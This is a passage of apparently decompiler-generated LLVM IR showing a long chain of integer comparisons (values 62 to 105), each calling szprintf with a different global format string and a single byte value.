dec_label_pc_100049fc:                            ; preds = %dec_label_pc_100049a8, %dec_label_pc_100049b4
  %v3_10004a00 = icmp eq i32 %v2_10003594, 62
  br i1 %v3_10004a00, label %dec_label_pc_10004a08, label %dec_label_pc_10004a50

dec_label_pc_10004a08:                            ; preds = %dec_label_pc_100049fc
  %v2_10004a08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a1c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004a1c = zext i8 %v3_10004a1c to i32
  %v4_10004a4c = call i32 @szprintf(i32 %v2_10004a08, i32 ptrtoint ([14 x i8]* @global_var_10017ef0.124 to i32), i32 %v4_10004a1c)
  br label %dec_label_pc_10004a50

dec_label_pc_10004a50:                            ; preds = %dec_label_pc_100049fc, %dec_label_pc_10004a08
  %v3_10004a54 = icmp eq i32 %v2_10003594, 63
  br i1 %v3_10004a54, label %dec_label_pc_10004a5c, label %dec_label_pc_10004aa4

dec_label_pc_10004a5c:                            ; preds = %dec_label_pc_10004a50
  %v2_10004a5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a70 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004a70 = zext i8 %v3_10004a70 to i32
  %v4_10004aa0 = call i32 @szprintf(i32 %v2_10004a5c, i32 ptrtoint ([14 x i8]* @global_var_10017f00.125 to i32), i32 %v4_10004a70)
  br label %dec_label_pc_10004aa4

dec_label_pc_10004aa4:                            ; preds = %dec_label_pc_10004a50, %dec_label_pc_10004a5c
  %v3_10004aa8 = icmp eq i32 %v2_10003594, 64
  br i1 %v3_10004aa8, label %dec_label_pc_10004ab0, label %dec_label_pc_10004af8

dec_label_pc_10004ab0:                            ; preds = %dec_label_pc_10004aa4
  %v2_10004ab0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ac4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004ac4 = zext i8 %v3_10004ac4 to i32
  %v4_10004af4 = call i32 @szprintf(i32 %v2_10004ab0, i32 ptrtoint ([13 x i8]* @global_var_10017f10.126 to i32), i32 %v4_10004ac4)
  br label %dec_label_pc_10004af8

dec_label_pc_10004af8:                            ; preds = %dec_label_pc_10004aa4, %dec_label_pc_10004ab0
  %v3_10004afc = icmp eq i32 %v2_10003594, 65
  br i1 %v3_10004afc, label %dec_label_pc_10004b04, label %dec_label_pc_10004b4c

dec_label_pc_10004b04:                            ; preds = %dec_label_pc_10004af8
  %v2_10004b04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b18 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004b18 = zext i8 %v3_10004b18 to i32
  %v4_10004b48 = call i32 @szprintf(i32 %v2_10004b04, i32 ptrtoint ([13 x i8]* @global_var_10017f20.127 to i32), i32 %v4_10004b18)
  br label %dec_label_pc_10004b4c

dec_label_pc_10004b4c:                            ; preds = %dec_label_pc_10004af8, %dec_label_pc_10004b04
  %v3_10004b50 = icmp eq i32 %v2_10003594, 66
  br i1 %v3_10004b50, label %dec_label_pc_10004b58, label %dec_label_pc_10004ba0

dec_label_pc_10004b58:                            ; preds = %dec_label_pc_10004b4c
  %v2_10004b58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b6c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004b6c = zext i8 %v3_10004b6c to i32
  %v4_10004b9c = call i32 @szprintf(i32 %v2_10004b58, i32 ptrtoint ([13 x i8]* @global_var_10017f30.128 to i32), i32 %v4_10004b6c)
  br label %dec_label_pc_10004ba0

dec_label_pc_10004ba0:                            ; preds = %dec_label_pc_10004b4c, %dec_label_pc_10004b58
  %v3_10004ba4 = icmp eq i32 %v2_10003594, 67
  br i1 %v3_10004ba4, label %dec_label_pc_10004bac, label %dec_label_pc_10004bf4

dec_label_pc_10004bac:                            ; preds = %dec_label_pc_10004ba0
  %v2_10004bac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bc0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004bc0 = zext i8 %v3_10004bc0 to i32
  %v4_10004bf0 = call i32 @szprintf(i32 %v2_10004bac, i32 ptrtoint ([12 x i8]* @global_var_10017f40.129 to i32), i32 %v4_10004bc0)
  br label %dec_label_pc_10004bf4

dec_label_pc_10004bf4:                            ; preds = %dec_label_pc_10004ba0, %dec_label_pc_10004bac
  %v3_10004bf8 = icmp eq i32 %v2_10003594, 68
  br i1 %v3_10004bf8, label %dec_label_pc_10004c00, label %dec_label_pc_10004c48

dec_label_pc_10004c00:                            ; preds = %dec_label_pc_10004bf4
  %v2_10004c00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c14 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004c14 = zext i8 %v3_10004c14 to i32
  %v4_10004c44 = call i32 @szprintf(i32 %v2_10004c00, i32 ptrtoint ([13 x i8]* @global_var_10017f4c.130 to i32), i32 %v4_10004c14)
  br label %dec_label_pc_10004c48

dec_label_pc_10004c48:                            ; preds = %dec_label_pc_10004bf4, %dec_label_pc_10004c00
  %v3_10004c4c = icmp eq i32 %v2_10003594, 69
  br i1 %v3_10004c4c, label %dec_label_pc_10004c54, label %dec_label_pc_10004c9c

dec_label_pc_10004c54:                            ; preds = %dec_label_pc_10004c48
  %v2_10004c54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c68 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004c68 = zext i8 %v3_10004c68 to i32
  %v4_10004c98 = call i32 @szprintf(i32 %v2_10004c54, i32 ptrtoint ([13 x i8]* @global_var_10017f5c.131 to i32), i32 %v4_10004c68)
  br label %dec_label_pc_10004c9c

dec_label_pc_10004c9c:                            ; preds = %dec_label_pc_10004c48, %dec_label_pc_10004c54
  %v3_10004ca0 = icmp eq i32 %v2_10003594, 70
  br i1 %v3_10004ca0, label %dec_label_pc_10004ca8, label %dec_label_pc_10004cf0

dec_label_pc_10004ca8:                            ; preds = %dec_label_pc_10004c9c
  %v2_10004ca8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cbc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004cbc = zext i8 %v3_10004cbc to i32
  %v4_10004cec = call i32 @szprintf(i32 %v2_10004ca8, i32 ptrtoint ([13 x i8]* @global_var_10017f6c.132 to i32), i32 %v4_10004cbc)
  br label %dec_label_pc_10004cf0

dec_label_pc_10004cf0:                            ; preds = %dec_label_pc_10004c9c, %dec_label_pc_10004ca8
  %v3_10004cf4 = icmp eq i32 %v2_10003594, 71
  br i1 %v3_10004cf4, label %dec_label_pc_10004cfc, label %dec_label_pc_10004d44

dec_label_pc_10004cfc:                            ; preds = %dec_label_pc_10004cf0
  %v2_10004cfc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d10 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004d10 = zext i8 %v3_10004d10 to i32
  %v4_10004d40 = call i32 @szprintf(i32 %v2_10004cfc, i32 ptrtoint ([13 x i8]* @global_var_10017f7c.133 to i32), i32 %v4_10004d10)
  br label %dec_label_pc_10004d44

dec_label_pc_10004d44:                            ; preds = %dec_label_pc_10004cf0, %dec_label_pc_10004cfc
  %v3_10004d48 = icmp eq i32 %v2_10003594, 72
  br i1 %v3_10004d48, label %dec_label_pc_10004d50, label %dec_label_pc_10004d98

dec_label_pc_10004d50:                            ; preds = %dec_label_pc_10004d44
  %v2_10004d50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d64 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004d64 = zext i8 %v3_10004d64 to i32
  %v4_10004d94 = call i32 @szprintf(i32 %v2_10004d50, i32 ptrtoint ([13 x i8]* @global_var_10017f8c.134 to i32), i32 %v4_10004d64)
  br label %dec_label_pc_10004d98

dec_label_pc_10004d98:                            ; preds = %dec_label_pc_10004d44, %dec_label_pc_10004d50
  %v3_10004d9c = icmp eq i32 %v2_10003594, 73
  br i1 %v3_10004d9c, label %dec_label_pc_10004da4, label %dec_label_pc_10004dec

dec_label_pc_10004da4:                            ; preds = %dec_label_pc_10004d98
  %v2_10004da4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004db8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004db8 = zext i8 %v3_10004db8 to i32
  %v4_10004de8 = call i32 @szprintf(i32 %v2_10004da4, i32 ptrtoint ([13 x i8]* @global_var_10017f9c.135 to i32), i32 %v4_10004db8)
  br label %dec_label_pc_10004dec

dec_label_pc_10004dec:                            ; preds = %dec_label_pc_10004d98, %dec_label_pc_10004da4
  %v3_10004df0 = icmp eq i32 %v2_10003594, 74
  br i1 %v3_10004df0, label %dec_label_pc_10004df8, label %dec_label_pc_10004e40

dec_label_pc_10004df8:                            ; preds = %dec_label_pc_10004dec
  %v2_10004df8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e0c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004e0c = zext i8 %v3_10004e0c to i32
  %v4_10004e3c = call i32 @szprintf(i32 %v2_10004df8, i32 ptrtoint ([12 x i8]* @global_var_10017fac.136 to i32), i32 %v4_10004e0c)
  br label %dec_label_pc_10004e40

dec_label_pc_10004e40:                            ; preds = %dec_label_pc_10004dec, %dec_label_pc_10004df8
  %v3_10004e44 = icmp eq i32 %v2_10003594, 75
  br i1 %v3_10004e44, label %dec_label_pc_10004e4c, label %dec_label_pc_10004e94

dec_label_pc_10004e4c:                            ; preds = %dec_label_pc_10004e40
  %v2_10004e4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e60 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004e60 = zext i8 %v3_10004e60 to i32
  %v4_10004e90 = call i32 @szprintf(i32 %v2_10004e4c, i32 ptrtoint ([14 x i8]* @global_var_10017fb8.137 to i32), i32 %v4_10004e60)
  br label %dec_label_pc_10004e94

dec_label_pc_10004e94:                            ; preds = %dec_label_pc_10004e40, %dec_label_pc_10004e4c
  %v3_10004e98 = icmp eq i32 %v2_10003594, 76
  br i1 %v3_10004e98, label %dec_label_pc_10004ea0, label %dec_label_pc_10004ee8

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e94
  %v2_10004ea0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004eb4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004eb4 = zext i8 %v3_10004eb4 to i32
  %v4_10004ee4 = call i32 @szprintf(i32 %v2_10004ea0, i32 ptrtoint ([11 x i8]* @global_var_10017fc8.138 to i32), i32 %v4_10004eb4)
  br label %dec_label_pc_10004ee8

dec_label_pc_10004ee8:                            ; preds = %dec_label_pc_10004e94, %dec_label_pc_10004ea0
  %v3_10004eec = icmp eq i32 %v2_10003594, 77
  br i1 %v3_10004eec, label %dec_label_pc_10004ef4, label %dec_label_pc_10004f3c

dec_label_pc_10004ef4:                            ; preds = %dec_label_pc_10004ee8
  %v2_10004ef4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f08 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004f08 = zext i8 %v3_10004f08 to i32
  %v4_10004f38 = call i32 @szprintf(i32 %v2_10004ef4, i32 ptrtoint ([13 x i8]* @global_var_10017fd4.139 to i32), i32 %v4_10004f08)
  br label %dec_label_pc_10004f3c

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004ee8, %dec_label_pc_10004ef4
  %v3_10004f40 = icmp eq i32 %v2_10003594, 78
  br i1 %v3_10004f40, label %dec_label_pc_10004f48, label %dec_label_pc_10004f90

dec_label_pc_10004f48:                            ; preds = %dec_label_pc_10004f3c
  %v2_10004f48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f5c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004f5c = zext i8 %v3_10004f5c to i32
  %v4_10004f8c = call i32 @szprintf(i32 %v2_10004f48, i32 ptrtoint ([11 x i8]* @global_var_10017fe4.140 to i32), i32 %v4_10004f5c)
  br label %dec_label_pc_10004f90

dec_label_pc_10004f90:                            ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f48
  %v3_10004f94 = icmp eq i32 %v2_10003594, 79
  br i1 %v3_10004f94, label %dec_label_pc_10004f9c, label %dec_label_pc_10004fe4

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f90
  %v2_10004f9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fb0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10004fb0 = zext i8 %v3_10004fb0 to i32
  %v4_10004fe0 = call i32 @szprintf(i32 %v2_10004f9c, i32 ptrtoint ([13 x i8]* @global_var_10017ff0.141 to i32), i32 %v4_10004fb0)
  br label %dec_label_pc_10004fe4

dec_label_pc_10004fe4:                            ; preds = %dec_label_pc_10004f90, %dec_label_pc_10004f9c
  %v3_10004fe8 = icmp eq i32 %v2_10003594, 80
  br i1 %v3_10004fe8, label %dec_label_pc_10004ff0, label %dec_label_pc_10005038

dec_label_pc_10004ff0:                            ; preds = %dec_label_pc_10004fe4
  %v2_10004ff0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005004 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005004 = zext i8 %v3_10005004 to i32
  %v4_10005034 = call i32 @szprintf(i32 %v2_10004ff0, i32 ptrtoint ([12 x i8]* @global_var_10018000.142 to i32), i32 %v4_10005004)
  br label %dec_label_pc_10005038

dec_label_pc_10005038:                            ; preds = %dec_label_pc_10004fe4, %dec_label_pc_10004ff0
  %v3_1000503c = icmp eq i32 %v2_10003594, 81
  br i1 %v3_1000503c, label %dec_label_pc_10005044, label %dec_label_pc_1000508c

dec_label_pc_10005044:                            ; preds = %dec_label_pc_10005038
  %v2_10005044 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005058 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005058 = zext i8 %v3_10005058 to i32
  %v4_10005088 = call i32 @szprintf(i32 %v2_10005044, i32 ptrtoint ([13 x i8]* @global_var_1001800c.143 to i32), i32 %v4_10005058)
  br label %dec_label_pc_1000508c

dec_label_pc_1000508c:                            ; preds = %dec_label_pc_10005038, %dec_label_pc_10005044
  %v3_10005090 = icmp eq i32 %v2_10003594, 82
  br i1 %v3_10005090, label %dec_label_pc_10005098, label %dec_label_pc_100050e0

dec_label_pc_10005098:                            ; preds = %dec_label_pc_1000508c
  %v2_10005098 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100050ac = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100050ac = zext i8 %v3_100050ac to i32
  %v4_100050dc = call i32 @szprintf(i32 %v2_10005098, i32 ptrtoint ([13 x i8]* @global_var_1001801c.144 to i32), i32 %v4_100050ac)
  br label %dec_label_pc_100050e0

dec_label_pc_100050e0:                            ; preds = %dec_label_pc_1000508c, %dec_label_pc_10005098
  %v3_100050e4 = icmp eq i32 %v2_10003594, 83
  br i1 %v3_100050e4, label %dec_label_pc_100050ec, label %dec_label_pc_10005134

dec_label_pc_100050ec:                            ; preds = %dec_label_pc_100050e0
  %v2_100050ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005100 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005100 = zext i8 %v3_10005100 to i32
  %v4_10005130 = call i32 @szprintf(i32 %v2_100050ec, i32 ptrtoint ([13 x i8]* @global_var_1001802c.145 to i32), i32 %v4_10005100)
  br label %dec_label_pc_10005134

dec_label_pc_10005134:                            ; preds = %dec_label_pc_100050e0, %dec_label_pc_100050ec
  %v3_10005138 = icmp eq i32 %v2_10003594, 84
  br i1 %v3_10005138, label %dec_label_pc_10005140, label %dec_label_pc_10005188

dec_label_pc_10005140:                            ; preds = %dec_label_pc_10005134
  %v2_10005140 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005154 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005154 = zext i8 %v3_10005154 to i32
  %v4_10005184 = call i32 @szprintf(i32 %v2_10005140, i32 ptrtoint ([14 x i8]* @global_var_1001803c.146 to i32), i32 %v4_10005154)
  br label %dec_label_pc_10005188

dec_label_pc_10005188:                            ; preds = %dec_label_pc_10005134, %dec_label_pc_10005140
  %v3_1000518c = icmp eq i32 %v2_10003594, 85
  br i1 %v3_1000518c, label %dec_label_pc_10005194, label %dec_label_pc_100051dc

dec_label_pc_10005194:                            ; preds = %dec_label_pc_10005188
  %v2_10005194 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051a8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100051a8 = zext i8 %v3_100051a8 to i32
  %v4_100051d8 = call i32 @szprintf(i32 %v2_10005194, i32 ptrtoint ([11 x i8]* @global_var_1001804c.147 to i32), i32 %v4_100051a8)
  br label %dec_label_pc_100051dc

dec_label_pc_100051dc:                            ; preds = %dec_label_pc_10005188, %dec_label_pc_10005194
  %v3_100051e0 = icmp eq i32 %v2_10003594, 86
  br i1 %v3_100051e0, label %dec_label_pc_100051e8, label %dec_label_pc_10005230

dec_label_pc_100051e8:                            ; preds = %dec_label_pc_100051dc
  %v2_100051e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051fc = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100051fc = zext i8 %v3_100051fc to i32
  %v4_1000522c = call i32 @szprintf(i32 %v2_100051e8, i32 ptrtoint ([13 x i8]* @global_var_10018058.148 to i32), i32 %v4_100051fc)
  br label %dec_label_pc_10005230

dec_label_pc_10005230:                            ; preds = %dec_label_pc_100051dc, %dec_label_pc_100051e8
  %v3_10005234 = icmp eq i32 %v2_10003594, 87
  br i1 %v3_10005234, label %dec_label_pc_1000523c, label %dec_label_pc_10005284

dec_label_pc_1000523c:                            ; preds = %dec_label_pc_10005230
  %v2_1000523c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005250 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005250 = zext i8 %v3_10005250 to i32
  %v4_10005280 = call i32 @szprintf(i32 %v2_1000523c, i32 ptrtoint ([13 x i8]* @global_var_10018068.149 to i32), i32 %v4_10005250)
  br label %dec_label_pc_10005284

dec_label_pc_10005284:                            ; preds = %dec_label_pc_10005230, %dec_label_pc_1000523c
  %v3_10005288 = icmp eq i32 %v2_10003594, 88
  br i1 %v3_10005288, label %dec_label_pc_10005290, label %dec_label_pc_100052d8

dec_label_pc_10005290:                            ; preds = %dec_label_pc_10005284
  %v2_10005290 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052a4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100052a4 = zext i8 %v3_100052a4 to i32
  %v4_100052d4 = call i32 @szprintf(i32 %v2_10005290, i32 ptrtoint ([13 x i8]* @global_var_10018078.150 to i32), i32 %v4_100052a4)
  br label %dec_label_pc_100052d8

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_10005284, %dec_label_pc_10005290
  %v3_100052dc = icmp eq i32 %v2_10003594, 89
  br i1 %v3_100052dc, label %dec_label_pc_100052e4, label %dec_label_pc_1000532c

dec_label_pc_100052e4:                            ; preds = %dec_label_pc_100052d8
  %v2_100052e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052f8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100052f8 = zext i8 %v3_100052f8 to i32
  %v4_10005328 = call i32 @szprintf(i32 %v2_100052e4, i32 ptrtoint ([13 x i8]* @global_var_10018088.151 to i32), i32 %v4_100052f8)
  br label %dec_label_pc_1000532c

dec_label_pc_1000532c:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_100052e4
  %v3_10005330 = icmp eq i32 %v2_10003594, 90
  br i1 %v3_10005330, label %dec_label_pc_10005338, label %dec_label_pc_10005380

dec_label_pc_10005338:                            ; preds = %dec_label_pc_1000532c
  %v2_10005338 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000534c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000534c = zext i8 %v3_1000534c to i32
  %v4_1000537c = call i32 @szprintf(i32 %v2_10005338, i32 ptrtoint ([11 x i8]* @global_var_10018098.152 to i32), i32 %v4_1000534c)
  br label %dec_label_pc_10005380

dec_label_pc_10005380:                            ; preds = %dec_label_pc_1000532c, %dec_label_pc_10005338
  %v3_10005384 = icmp eq i32 %v2_10003594, 91
  br i1 %v3_10005384, label %dec_label_pc_1000538c, label %dec_label_pc_100053d4

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_10005380
  %v2_1000538c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053a0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100053a0 = zext i8 %v3_100053a0 to i32
  %v4_100053d0 = call i32 @szprintf(i32 %v2_1000538c, i32 ptrtoint ([12 x i8]* @global_var_100180a4.153 to i32), i32 %v4_100053a0)
  br label %dec_label_pc_100053d4

dec_label_pc_100053d4:                            ; preds = %dec_label_pc_10005380, %dec_label_pc_1000538c
  %v3_100053d8 = icmp eq i32 %v2_10003594, 92
  br i1 %v3_100053d8, label %dec_label_pc_100053e0, label %dec_label_pc_10005428

dec_label_pc_100053e0:                            ; preds = %dec_label_pc_100053d4
  %v2_100053e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053f4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100053f4 = zext i8 %v3_100053f4 to i32
  %v4_10005424 = call i32 @szprintf(i32 %v2_100053e0, i32 ptrtoint ([13 x i8]* @global_var_100180b0.154 to i32), i32 %v4_100053f4)
  br label %dec_label_pc_10005428

dec_label_pc_10005428:                            ; preds = %dec_label_pc_100053d4, %dec_label_pc_100053e0
  %v3_1000542c = icmp eq i32 %v2_10003594, 93
  br i1 %v3_1000542c, label %dec_label_pc_10005434, label %dec_label_pc_1000547c

dec_label_pc_10005434:                            ; preds = %dec_label_pc_10005428
  %v2_10005434 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005448 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005448 = zext i8 %v3_10005448 to i32
  %v4_10005478 = call i32 @szprintf(i32 %v2_10005434, i32 ptrtoint ([12 x i8]* @global_var_100180c0.155 to i32), i32 %v4_10005448)
  br label %dec_label_pc_1000547c

dec_label_pc_1000547c:                            ; preds = %dec_label_pc_10005428, %dec_label_pc_10005434
  %v3_10005480 = icmp eq i32 %v2_10003594, 94
  br i1 %v3_10005480, label %dec_label_pc_10005488, label %dec_label_pc_100054d0

dec_label_pc_10005488:                            ; preds = %dec_label_pc_1000547c
  %v2_10005488 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000549c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000549c = zext i8 %v3_1000549c to i32
  %v4_100054cc = call i32 @szprintf(i32 %v2_10005488, i32 ptrtoint ([13 x i8]* @global_var_100180cc.156 to i32), i32 %v4_1000549c)
  br label %dec_label_pc_100054d0

dec_label_pc_100054d0:                            ; preds = %dec_label_pc_1000547c, %dec_label_pc_10005488
  %v3_100054d4 = icmp eq i32 %v2_10003594, 95
  br i1 %v3_100054d4, label %dec_label_pc_100054dc, label %dec_label_pc_10005524

dec_label_pc_100054dc:                            ; preds = %dec_label_pc_100054d0
  %v2_100054dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100054f0 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100054f0 = zext i8 %v3_100054f0 to i32
  %v4_10005520 = call i32 @szprintf(i32 %v2_100054dc, i32 ptrtoint ([12 x i8]* @global_var_100180dc.157 to i32), i32 %v4_100054f0)
  br label %dec_label_pc_10005524

dec_label_pc_10005524:                            ; preds = %dec_label_pc_100054d0, %dec_label_pc_100054dc
  %v3_10005528 = icmp eq i32 %v2_10003594, 96
  br i1 %v3_10005528, label %dec_label_pc_10005530, label %dec_label_pc_10005578

dec_label_pc_10005530:                            ; preds = %dec_label_pc_10005524
  %v2_10005530 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005544 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005544 = zext i8 %v3_10005544 to i32
  %v4_10005574 = call i32 @szprintf(i32 %v2_10005530, i32 ptrtoint ([11 x i8]* @global_var_100180e8.158 to i32), i32 %v4_10005544)
  br label %dec_label_pc_10005578

dec_label_pc_10005578:                            ; preds = %dec_label_pc_10005524, %dec_label_pc_10005530
  %v3_1000557c = icmp eq i32 %v2_10003594, 97
  br i1 %v3_1000557c, label %dec_label_pc_10005584, label %dec_label_pc_100055cc

dec_label_pc_10005584:                            ; preds = %dec_label_pc_10005578
  %v2_10005584 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005598 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005598 = zext i8 %v3_10005598 to i32
  %v4_100055c8 = call i32 @szprintf(i32 %v2_10005584, i32 ptrtoint ([12 x i8]* @global_var_100180f4.159 to i32), i32 %v4_10005598)
  br label %dec_label_pc_100055cc

dec_label_pc_100055cc:                            ; preds = %dec_label_pc_10005578, %dec_label_pc_10005584
  %v3_100055d0 = icmp eq i32 %v2_10003594, 98
  br i1 %v3_100055d0, label %dec_label_pc_100055d8, label %dec_label_pc_10005620

dec_label_pc_100055d8:                            ; preds = %dec_label_pc_100055cc
  %v2_100055d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100055ec = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100055ec = zext i8 %v3_100055ec to i32
  %v4_1000561c = call i32 @szprintf(i32 %v2_100055d8, i32 ptrtoint ([12 x i8]* @global_var_10018100.160 to i32), i32 %v4_100055ec)
  br label %dec_label_pc_10005620

dec_label_pc_10005620:                            ; preds = %dec_label_pc_100055cc, %dec_label_pc_100055d8
  %v3_10005624 = icmp eq i32 %v2_10003594, 99
  br i1 %v3_10005624, label %dec_label_pc_1000562c, label %dec_label_pc_10005674

dec_label_pc_1000562c:                            ; preds = %dec_label_pc_10005620
  %v2_1000562c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005640 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005640 = zext i8 %v3_10005640 to i32
  %v4_10005670 = call i32 @szprintf(i32 %v2_1000562c, i32 ptrtoint ([12 x i8]* @global_var_1001810c.161 to i32), i32 %v4_10005640)
  br label %dec_label_pc_10005674

dec_label_pc_10005674:                            ; preds = %dec_label_pc_10005620, %dec_label_pc_1000562c
  %v3_10005678 = icmp eq i32 %v2_10003594, 100
  br i1 %v3_10005678, label %dec_label_pc_10005680, label %dec_label_pc_100056c8

dec_label_pc_10005680:                            ; preds = %dec_label_pc_10005674
  %v2_10005680 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005694 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005694 = zext i8 %v3_10005694 to i32
  %v4_100056c4 = call i32 @szprintf(i32 %v2_10005680, i32 ptrtoint ([12 x i8]* @global_var_10018118.162 to i32), i32 %v4_10005694)
  br label %dec_label_pc_100056c8

dec_label_pc_100056c8:                            ; preds = %dec_label_pc_10005674, %dec_label_pc_10005680
  %v3_100056cc = icmp eq i32 %v2_10003594, 101
  br i1 %v3_100056cc, label %dec_label_pc_100056d4, label %dec_label_pc_1000571c

dec_label_pc_100056d4:                            ; preds = %dec_label_pc_100056c8
  %v2_100056d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100056e8 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100056e8 = zext i8 %v3_100056e8 to i32
  %v4_10005718 = call i32 @szprintf(i32 %v2_100056d4, i32 ptrtoint ([12 x i8]* @global_var_10018124.163 to i32), i32 %v4_100056e8)
  br label %dec_label_pc_1000571c

dec_label_pc_1000571c:                            ; preds = %dec_label_pc_100056c8, %dec_label_pc_100056d4
  %v3_10005720 = icmp eq i32 %v2_10003594, 102
  br i1 %v3_10005720, label %dec_label_pc_10005728, label %dec_label_pc_10005770

dec_label_pc_10005728:                            ; preds = %dec_label_pc_1000571c
  %v2_10005728 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000573c = load i8, i8* @global_var_1002b913.60, align 1
  %v4_1000573c = zext i8 %v3_1000573c to i32
  %v4_1000576c = call i32 @szprintf(i32 %v2_10005728, i32 ptrtoint ([13 x i8]* @global_var_10018130.164 to i32), i32 %v4_1000573c)
  br label %dec_label_pc_10005770

dec_label_pc_10005770:                            ; preds = %dec_label_pc_1000571c, %dec_label_pc_10005728
  %v3_10005774 = icmp eq i32 %v2_10003594, 103
  br i1 %v3_10005774, label %dec_label_pc_1000577c, label %dec_label_pc_100057c4

dec_label_pc_1000577c:                            ; preds = %dec_label_pc_10005770
  %v2_1000577c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005790 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_10005790 = zext i8 %v3_10005790 to i32
  %v4_100057c0 = call i32 @szprintf(i32 %v2_1000577c, i32 ptrtoint ([13 x i8]* @global_var_10018140.165 to i32), i32 %v4_10005790)
  br label %dec_label_pc_100057c4

dec_label_pc_100057c4:                            ; preds = %dec_label_pc_10005770, %dec_label_pc_1000577c
  %v3_100057c8 = icmp eq i32 %v2_10003594, 104
  br i1 %v3_100057c8, label %dec_label_pc_100057d0, label %dec_label_pc_10005818

dec_label_pc_100057d0:                            ; preds = %dec_label_pc_100057c4
  %v2_100057d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057e4 = load i8, i8* @global_var_1002b913.60, align 1
  %v4_100057e4 = zext i8 %v3_100057e4 to i32
  %v4_10005814 = call i32 @szprintf(i32 %v2_100057d0, i32 ptrtoint ([13 x i8]* @global_var_10018150.166 to i32), i32 %v4_100057e4)
  br label %dec_label_pc_10005818

dec_label_pc_10005818:                            ; preds = %dec_label_pc_100057c4, %dec_label_pc_100057d0
  %v3_1000581c = icmp eq i32 %v2_10003594, 105
